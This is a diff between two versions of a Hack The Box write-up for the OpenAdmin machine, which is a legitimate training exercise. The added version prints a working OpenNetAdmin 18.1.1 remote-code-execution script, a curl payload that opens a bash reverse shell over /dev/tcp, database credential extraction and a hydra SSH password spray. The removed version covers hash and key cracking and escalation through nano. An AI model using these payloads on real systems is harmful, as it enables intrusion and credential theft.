@@ -1,8 +1,8 @@
 ---
 layout: single
 title: OpenAdmin - Hack The Box
-excerpt: "OpenAdmin is an easy box that starts with using an exploit for the OpenNetAdmin software to get initial RCE. Then we get credentials from the database config and can re-use them to connect by SSH. We then find another web application with an hardcoded SHA512 hash in the PHP code for the login page. After cracking it we're able to log in and obtain an encrypted SSH key that we have to crack. After getting one more shell, we can run nano as root with sudo and spawn a shell as root."
-date: 2020-05-02
+excerpt: "In this box we will be exploiting the OpenNetAdmin software, this is a system for tracking IP network attributes in a database, there are also several backend processes for building DHCP, DNS, router configuration, etc. We will get a reverse shell as the user www-data and gain access to the low privileged user jimmy thanks to credentials found in a database configuration file. Before getting root we will have to gain access to the user joanna and finally escalate privileges to root by abusing the nano binary."
+date: 2021-08-21
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-openadmin/openadmin_logo.png
@@ -13,117 +13,206 @@ categories:
   - infosec
 tags:
   - opennetadmin
-  - unintended
   - db creds
   - gtfobins
 ---
 
 ![](/assets/images/htb-writeup-openadmin/openadmin_logo.png)
 
-OpenAdmin is an easy box that starts with using an exploit for the OpenNetAdmin software to get initial RCE. Then we get credentials from the database config and can re-use them to connect by SSH. We then find another web application with an hardcoded SHA512 hash in the PHP code for the login page. After cracking it we're able to log in and obtain an encrypted SSH key that we have to crack. After getting one more shell, we can run nano as root with sudo and spawn a shell as root.
+# Description
 
-## Summary
+In this box we will be exploiting the OpenNetAdmin software, this is a system for tracking IP network attributes in a database, there are also several backend processes for building DHCP, DNS, router configuration, etc. We will get a reverse shell as the user www-data and gain access to the low privileged user jimmy thanks to credentials found in a database configuration file. Before getting root we will have to gain access to the user joanna and finally escalate privileges to root by abusing the nano binary.
 
-- Find the OpenNetAdmin page and use a remote code execution exploit to get access to user www-data
-- The DB credentials from the OpenNetAdmin configuration file are re-used for SSH access as user jimmy
-- Find another internal website running and get a SHA512 hash from the PHP code
-- After cracking the hash, log into the application and find an encrypted SSH private key
-- Crack the key and then log in a user joanna and get the first flag
-- Look at the sudo commands and find that nano can be run as root, look up gtfobins and spawn /bin/bash from nano
+# Recognition phase
 
+Let's start with which ports are open via the TCP protocol.
 ```
-root@kali:~/htb/openadmin# nmap -p- 10.10.10.171
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 14:41 EST
-Nmap scan report for openadmin.htb (10.10.10.171)
-Host is up (0.016s latency).
-Not shown: 65533 closed ports
+nmap -p- --open -T5 -v -n 10.10.10.171 -oN allPorts
+
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
 ```
+- -p- scan all ports.
+- --open becouse I only want it to scan ports with open status, not filtered or closed.
+- -T5 to indicate the speed, 5 is the maximum point, at the cost of going faster in scanning this calls much attention, but no problem because in Hack The Box we are in a controlled environment. 
+- -v verbose.
+- -n To indicate that we do not want DNS resolution to be applied, this makes the scanning go a little faster.
 
-## Web enumeration
-
-The default Ubuntu page is shown when I check out the webserver's root directory.
-
-![](/assets/images/htb-writeup-openadmin/web1.png)
-
-Let's run gobuster to find hidden files and directories:
-
+Now let's launch some basic enumeration scripts and see what services and version are running on those ports.
 ```
-# gobuster dir -t 50 -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x php -u http://openadmin.htb
-[...]
-/artwork (Status: 301)
-/music (Status: 301)
-/server-status (Status: 403)
-/sierra (Status: 301)
+nmap -sC -sV -p22,80 10.10.10.171 -oN targeted
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+- -sC equivalent to --script=default, this will cause basic enumeration scripts to be launched.
+- -sV to determine service/version info.
 
-So I found a couple of static web pages for the three directories above:
-
-![](/assets/images/htb-writeup-openadmin/web2.png)
-
-![](/assets/images/htb-writeup-openadmin/web3.png)
-
-![](/assets/images/htb-writeup-openadmin/web4.png)
-
-## OpenNetAdmin RCE
-
-The `/music` page's login link goes to `http://openadmin.htb/ona/` which is running OpenNetAdmin, a system for tracking IP network attributes in a database.
-
-![](/assets/images/htb-writeup-openadmin/ona.png)
-
-I see it's running `v18.1.1` and a quick search on exploit-db shows I can get RCE by exploiting a bug in the application.
+The SSH service version does not seem to have any critical vulnerability, so we start with enumerating port 80, we launch a whatweb to know more about the http service but not having relevant information to enumerate extensions, we launch a simple fuzz.
 
 ```
-OpenNetAdmin 18.1.1 - Remote Code Execution     | exploits/php/webapps/47691.sh
+ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/FUZZ
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.171/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response words: 3499
+________________________________________________
+
+music                   [Status: 301, Size: 312, Words: 20, Lines: 10]
+artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10]
+sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+:: Progress: [220560/220560] :: Job [1/1] :: 1220 req/sec :: Duration: [0:04:21] :: Errors: 0 ::
+```
+- -c for colorized output
+
+# Web server recognition
+
+Apache2 Ubuntu Default Page, there is nothing interesting in the source code.
+
+![](/assets/images/htb-writeup-openadmin/apache-default.png)
+
+### Let's see what ffuf found.
+
+Exploring the three pages /music, /artwork and /sierra.
+
+## http://10.10.10.171/music
+
+![](/assets/images/htb-writeup-openadmin/music-page.png)
+
+In the source code we do not find anything interesting, the other resources of the page only take us to some basic html templates, we also see that there is a potential registration >
+
+![](/assets/images/htb-writeup-openadmin/ona-page.png)
+
+We access the IP Address Management OpenNetAdmin as a guest user, looking for the default credentials of version 18.1.1 I found that they are admin:admin, we test them to discard default credentials and they work, we are logged in as administrator.
+
+Here I paused before continuing with OpenNetAdmin to check the other pages that ffuf found but there is nothing interesting, only resources with html templates.
+
+http://10.10.10.171/artwork
+
+![](/assets/images/htb-writeup-openadmin/artwork-page.png)
+
+http://10.10.10.171/sierra
+
+![](/assets/images/htb-writeup-openadmin/sierra-page.png)
+
+There doesn't seem to be anything interesting on those two pages, so let's move on to OpenNetAdmin.
+
+### Search exploits for OpenNetAdmin v18.1.1
+
+Searching a bit I found this script where apparently we get remote command execution.
+```
+#!/bin/bash
+
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}"
+done
+```
+What the script does is a loop of reading the commands that we enter by console and then through curl send it as data through the POST method to the url that we enter (http://10.10.10.171/ona).
+
+We already know what the script does, but we can do it manually by modifying the variables that it takes in line 6, basically we indicate manually the command that we want to execute remotely and the url.
+```
+curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" "http://10.10.10.171/ona/"
+```
+- Something I would like to point out is that with curl it is always good practice to add a / at the end when indicating the URL.
+
+![](/assets/images/htb-writeup-openadmin/rce-works.png)
+
+Perfect! we have remote command execution, let's see if we can send us a reverse shell with bash URL encoding.
+
+```
+curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F443%200%3E%261%22&xajaxargs[]=ping" "http://10.10.10.171/ona/"
 ```
 
-After executing the exploit I have RCE as user `www-data`.
-
 ```
-root@kali:~/htb/openadmin# ./exploit.sh http://openadmin.htb/ona/
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+nc -nlvp 443
 
-## Unintended path to root flag
-
-While looking around the filesystem I found a hash in `priv.save` which turned out to be the root flag.
-```
-$ ls -l /opt
-total 12
-drwxr-x--- 7 www-data www-data 4096 Nov 21 18:23 ona
--rw-r--r-- 1 root     root        0 Nov 22 23:49 priv
--rw-r--r-- 1 root     root       33 Jan  2 20:54 priv.save
--rw-r--r-- 1 root     root       33 Jan  2 21:12 priv.save.1
-$ cat /opt/priv.save
-2f907ed450b[...]
+listening on [any] 443 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.171] 56534
+bash: cannot set terminal process group (1248): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@openadmin:/opt/ona/www$ whoami
+whoami
+www-data
+www-data@openadmin:/opt/ona/www$
 ```
 
-## Escalating to user jimmy
-
-I see there's two additonal users which I don't have access to right now.
+- Reverse shell with bash URL encoding
 
 ```
-$ ls -l /home
-total 8
-drwxr-x--- 5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
-drwxr-x--- 6 joanna joanna 4096 Nov 28 09:37 joanna
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
+``` 
 
-$ lslogins
-  UID USER            PROC PWD-LOCK PWD-DENY  LAST-LOGIN GECOS
-[...]
- 1000 jimmy              0                   Jan02/20:50 jimmy
- 1001 joanna             0                   Jan02/21:12 ,,,
+Now let's make a treatment of the TTY.
+```
+script /dev/null -c bash
+Ctrl+Z
+stty raw -echo
+fg
+
+reset
+xterm
+export TERM=xterm-256color
+export SHELL=bash
 ```
 
-The OpenNetAdmin database credentials are shown in the `/database_settings.inc.php` file.
+# Privilege escalation.
+
+### First, let's see which of the existing users have a bash.
+```
+www-data@openadmin:/opt/ona/www$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+```
+
+### A good practice that I recommend in cases like these where there was a web server with potential users, is to look for a database configuration file.
 
 ```
-$ cat /opt/ona/www/local/config/database_settings.inc.php
+www-data@openadmin:/opt/ona/www$ grep -r -i passwd
+plugins/ona_nmap_scans/install.php:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
+include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
+include/functions_db.inc.php:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
+include/functions_db.inc.php:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
+.htaccess.example:# You will need to create an .htpasswd file that conforms to the standard
+.htaccess.example:# htaccess format, read the man page for htpasswd.  Change the 
+.htaccess.example:# AuthUserFile option below as needed to reference your .htpasswd file.
+.htaccess.example:# names, however, do need to be the same in both the .htpasswd and web
+.htaccess.example:    #AuthUserFile /opt/ona/www/.htpasswd
+local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!',
+winc/user_edit.inc.php:                    name="passwd"
+winc/user_edit.inc.php:    if (!$form['id'] and !$form['passwd']) {
+winc/user_edit.inc.php:    if ($form['passwd']) {
+winc/user_edit.inc.php:        $form['passwd'] = md5($form['passwd']);
+winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
+winc/user_edit.inc.php:        if (strlen($form['passwd']) < 32) {
+winc/user_edit.inc.php:            $form['passwd'] = $record['passwd'];
+winc/user_edit.inc.php:                'passwd'      => $form['passwd'],
+winc/tooltips.inc.php://     Builds HTML for changing tacacs enable passwd
+```
+We found something very striking:
+local/config/database_settings.inc.php:        'db_passwd' => 'n1nj4W4rri0R!'
+
+```
+www-data@openadmin:/opt/ona/www$ cat local/config/database_settings.inc.php
 <?php
 
 $ona_contexts=array (
@@ -147,101 +236,150 @@ $ona_contexts=array (
 );
 ```
 
-The `n1nj4W4rri0R!` password works with user `jimmy` to get an SSH shell:
+Let's dump the database
+```
+www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 27
+Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)
+
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| ona_default        |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql> use ona_default
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++------------------------+
+| Tables_in_ona_default  |
++------------------------+
+| blocks                 |
+| configuration_types    |
+| configurations         |
+| custom_attribute_types |
+| custom_attributes      |
+| dcm_module_list        |
+| device_types           |
+| devices                |
+| dhcp_failover_groups   |
+| dhcp_option_entries    |
+| dhcp_options           |
+| dhcp_pools             |
+| dhcp_server_subnets    |
+| dns                    |
+| dns_server_domains     |
+| dns_views              |
+| domains                |
+| group_assignments      |
+| groups                 |
+| host_roles             |
+| hosts                  |
+| interface_clusters     |
+| interfaces             |
+| locations              |
+| manufacturers          |
+| messages               |
+| models                 |
+| ona_logs               |
+| permission_assignments |
+| permissions            |
+| roles                  |
+| sequences              |
+| sessions               |
+| subnet_types           |
+| subnets                |
+| sys_config             |
+| tags                   |
+| users                  |
+| vlan_campuses          |
+| vlans                  |
++------------------------+
+40 rows in set (0.00 sec)
+
+mysql> describe users;
++----------+------------------+------+-----+-------------------+-----------------------------+
+| Field    | Type             | Null | Key | Default           | Extra                       |
++----------+------------------+------+-----+-------------------+-----------------------------+
+| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
+| username | varchar(32)      | NO   | UNI | NULL              |                             |
+| password | varchar(64)      | NO   |     | NULL              |                             |
+| level    | int(4)           | NO   |     | 0                 |                             |
+| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
+| atime    | datetime         | YES  |     | NULL              |                             |
++----------+------------------+------+-----+-------------------+-----------------------------+
+6 rows in set (0.00 sec)
+
+mysql> select * from users;
++----+----------+----------------------------------+-------+---------------------+---------------------+
+| id | username | password                         | level | ctime               | atime               |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2021-08-22 14:37:31 | 2021-08-22 14:37:31 |
+|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+```
+
+There are 2 users with passwords, let's try to unhash them to see if we can reuse them with any other user of the system.
+
+[CrackStation](https://crackstation.net/)
+
+098f6bcd4621d373cade4e832627b4f6:test
+21232f297a57a5a743894a0e4a801fc3:admin
+
+At this point, before continuing to list the system, let's try accessing a user with one of the three passwords we found. This could be done with hydra or medusa, then create two lists, one with the users who have a bash and the other with the three passwords found and start the attack.
 
 ```
-root@kali:~/htb/openadmin# ssh jimmy@10.10.10.171
-jimmy@10.10.10.171's password: 
+cat users.txt                                                  
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: users.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ root
+   2   │ jimmy
+   3   │ joanna
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 
-jimmy@openadmin:~$ id
-uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
-```
-
-## Escalating to user joanna
-
-Looking at the Apache2 configuration, I see there's an internal website running on port 52846.
-
-```
-$ ls -l /etc/apache2/sites-available/*
--rw-r--r-- 1 root root 6338 Jul 16 18:14 /etc/apache2/sites-available/default-ssl.conf
--rw-r--r-- 1 root root  303 Nov 23 17:13 /etc/apache2/sites-available/internal.conf
--rw-r--r-- 1 root root 1329 Nov 22 14:24 /etc/apache2/sites-available/openadmin.conf
-
-$ cat /etc/apache2/sites-available/internal.conf
-Listen 127.0.0.1:52846
-
-<VirtualHost 127.0.0.1:52846>
-    ServerName internal.openadmin.htb
-    DocumentRoot /var/www/internal
-
-<IfModule mpm_itk_module>
-AssignUserID joanna joanna
-</IfModule>
-
-    ErrorLog ${APACHE_LOG_DIR}/error.log
-    CustomLog ${APACHE_LOG_DIR}/access.log combined
-
-</VirtualHost>
-```
-
-The `index.php` file contains the username and SHA512 hash of the password.
-
-```php
-<h2>Enter Username and Password</h2>
-      <div class = "container form-signin">
-        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
-          <?php
-            $msg = '';
-
-            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
-              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
-                  $_SESSION['username'] = 'jimmy';
-                  header("Location: /main.php");
-              } else {
-                  $msg = 'Wrong username or password.';
-              }
-            }
-         ?>
-      </div>
-```
-
-The user is using a common password so the hash has already been cracked and I can do a search online and find the password: `Revealed`
-
-![](/assets/images/htb-writeup-openadmin/password.png)
-
-I'll reconnect my SSH session with port-forwarding so I can access the local site: `ssh jimmy@10.10.10.171 -L 52846:127.0.0.1:52846`
-
-![](/assets/images/htb-writeup-openadmin/internal1.png)
-
-![](/assets/images/htb-writeup-openadmin/internal2.png)
-
-The internal site contains the SSH private key for the joanna user. It's encrypted but I can crack it easily with john the ripper:
-
-![](/assets/images/htb-writeup-openadmin/cracked.png)
+cat pass.txt                  
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: pass.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ test
+   2   │ admin
+   3   │ n1nj4W4rri0R!
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 
 ```
-root@kali:~/htb/openadmin# ssh -i id_rsa joanna@10.10.10.171
-Enter passphrase for key 'id_rsa': 
-[...]
-joanna@openadmin:~$ cat user.txt
-c9b2cf07d[...]
-```
 
-## Root priv esc
+Let's start the hydra.
 
 ```
-joanna@openadmin:~$ sudo -l
-Matching Defaults entries for joanna on openadmin:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+hydra -L "users.txt" -P "pass.txt" -e nsr -s 22 ssh://10.10.10.171
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-User joanna may run the following commands on openadmin:
-    (ALL) NOPASSWD: /bin/nano /opt/priv
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-22 17:27:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:3/p:6), ~2 tries per task
+[DATA] attacking ssh://10.10.10.171:22/
+[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-22 17:27:58
 ```
+- -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login.
 
-`nano` is running as root, this is our way in. Looking at [GTFObins](https://gtfobins.github.io/gtfobins/nano/), I see an easy way to get a shell as root:
-
-![](/assets/images/htb-writeup-openadmin/gtfo.png)
-
-I'll use the first method to gain a root shell.
-
-![](/assets/images/htb-writeup-openadmin/root.png)
+Well done! we found a reused password for the user jimmy.
